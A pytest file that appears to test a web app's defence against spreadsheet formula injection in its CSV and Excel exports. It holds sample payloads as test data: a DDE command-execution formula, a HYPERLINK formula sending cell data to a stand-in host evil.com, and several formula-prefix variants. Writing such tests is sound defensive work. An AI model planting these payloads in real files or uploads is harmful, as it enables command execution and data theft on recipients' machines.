"""
An exported cell is not a formula.

Every export this product offers is aimed at Excel — the CSV endpoint
even writes a UTF-8 BOM so Excel picks the right encoding — and Excel
decides a cell is a formula from its first character. A value that
arrived in an uploaded file as text came out of the export unchanged:

    uploaded:  =cmd|'/c calc'!A1
    exported:  =cmd|'/c calc'!A1

and became executable the moment the recipient double-clicked the file
this product handed them. Measured end to end through the real
endpoints, not asserted from the code.

The attacker is whoever supplied the data; the victim is whoever
receives the export, and they are often not the same person — a shared
sheet, a supplier price list, a form dump. An upload is not trusted
merely because an account holder sent it.
"""
import io

import openpyxl
import pandas as pd
import pytest

from app.services.spreadsheet_safety import (is_risky_cell, neutralise,
                                             safe_columns, safe_for_export)

ATTACKS = [
    "=cmd|'/c calc'!A1",                          # DDE command execution
    '=HYPERLINK("http://evil.com?d="&A1,"click")',  # exfiltration on click
    "@SUM(1:2)",
    "+1+1",
    "\t=1+1",                                     # leading tab is stripped
    "\r=1+1",
    "-2+cmd|'/c calc'!A1",
]

SAFE = ["Normal", "-500", "-1,200.50", "", "North", "2024-01-01", "a=b"]


@pytest.mark.parametrize("value", ATTACKS)
def test_a_formula_start_is_recognised(value):
    assert is_risky_cell(value) is True
    assert neutralise(value).startswith("'")


@pytest.mark.parametrize("value", SAFE)
def test_ordinary_data_is_left_exactly_as_it_was(value):
    """A guard that mangles a column of negative numbers is worse than
    the problem — "-500" is a number written as text, not a formula."""
    assert is_risky_cell(value) is False
    assert neutralise(value) == value


def test_numbers_are_never_touched():
    assert neutralise(-500) == -500
    assert neutralise(0) == 0
    assert neutralise(None) is None


@pytest.mark.parametrize("dtype", [object, "str"])
def test_both_text_dtypes_are_scanned(dtype):
    """The first version checked `dtype != object` and skipped every
    column, because this project stores text with pandas' StringDtype —
    it reported zero changes on a frame full of formulas."""
    df = pd.DataFrame({
        "name": pd.Series(["=cmd|'/c calc'!A1", "+1+1", "Normal"], dtype=dtype),
        "amount": [10, 20, 30],
    })
    out, changed = safe_for_export(df)
    assert changed == 2
    assert out["name"].tolist() == ["'=cmd|'/c calc'!A1", "'+1+1", "Normal"]
    assert out["amount"].tolist() == [10, 20, 30]


def test_a_column_name_can_carry_one_too():
    """The header lands in row 1 of the export like any other cell."""
    assert safe_columns(["=1+1", "region"]) == ["'=1+1", "region"]


# ══════════════════════════════════════════════════════════
#  Through the real endpoints
# ══════════════════════════════════════════════════════════

MALICIOUS_CSV = (
    'name,note,amount\n'
    '"=cmd|\'/c calc\'!A1",ok,10\n'
    '"+1+1",fine,20\n'
    '"@SUM(1:2)",fine,40\n'
    'Normal,"=HYPERLINK(""http://evil.com"",""x"")",50\n'
    '"-500",negative,60\n'
)


@pytest.fixture()
def uploaded(tmp_path, monkeypatch):
    monkeypatch.setenv("DATA_DIR", str(tmp_path))
    from fastapi.testclient import TestClient
    from app.main import app
    client = TestClient(app)
    res = client.post("/api/datasets/upload",
                      files={"file": ("inj.csv", MALICIOUS_CSV.encode(),
                                      "text/csv")})
    assert res.status_code == 200
    return client, res.json()["meta"]["dataset_id"]


def test_the_csv_export_contains_no_runnable_cell(uploaded):
    client, ds_id = uploaded
    body = client.get(f"/api/reports/{ds_id}/csv").content.decode()
    runnable = [line for line in body.splitlines()
                if line.lstrip('"﻿').startswith(("=", "+", "@"))]
    assert runnable == []
    # and the ordinary values survived
    assert "-500" in body
    assert "Normal" in body


def test_the_excel_export_stores_text_as_text(uploaded):
    """xlsxwriter will turn a leading "=" back into a real formula
    object unless told not to, which would undo the escaping."""
    client, ds_id = uploaded
    res = client.get(f"/api/reports/{ds_id}/excel")
    assert res.status_code == 200

    sheet = openpyxl.load_workbook(io.BytesIO(res.content))["Data"]
    kinds = {cell.data_type for row in sheet.iter_rows() for cell in row}
    assert "f" not in kinds, "a cell was written as a live formula"


def test_the_export_records_what_it_changed(uploaded):
    """Altering a client's data on the way out is a thing the audit
    trail should be able to answer for."""
    client, ds_id = uploaded
    client.get(f"/api/reports/{ds_id}/csv")
    events = client.get(f"/api/datasets/{ds_id}/integrity").json()
    trail = str(events)
    assert "formula_cells_neutralised" in trail
